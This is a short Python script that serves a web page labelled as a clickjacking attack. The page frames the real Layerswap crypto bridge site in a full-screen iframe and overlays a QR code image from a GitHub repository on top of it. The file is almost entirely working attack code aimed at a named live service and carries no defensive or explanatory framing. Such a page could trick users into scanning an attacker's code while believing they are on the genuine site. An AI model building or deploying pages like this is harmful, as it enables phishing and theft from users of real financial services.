from http.server import BaseHTTPRequestHandler, HTTPServer

# HTML code for the clickjacking page with a QR code overlay
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Attack</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent; /* Fully transparent background */
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qr-code {
            width: 300px; /* Adjust the size as needed */
            height: 300px; /* Adjust the size as needed */
            margin-top: 0px; /* Adjust the amount of space you want above the QR code */
            margin-left: -1250px;
        }
    </style>
</head>
<body>
    <iframe src="https://www.layerswap.io/app"></iframe>
    <div class="overlay">
        <img src="https://raw.githubusercontent.com/DeadmanXXXII/Clickjacking/main/layerqr.png" class="qr-code" alt="QR Code">
    </div>
</body>
</html>
"""

# HTTP request handler class
class RequestHandler(BaseHTTPRequestHandler):
    # Handle GET requests
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_code.encode())

# Function to start the server
def start_server():
    server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, RequestHandler)
    print('Server started on http://0.0.0.0:8000')
    httpd.serve_forever()

if __name__ == "__main__":
    start_server()
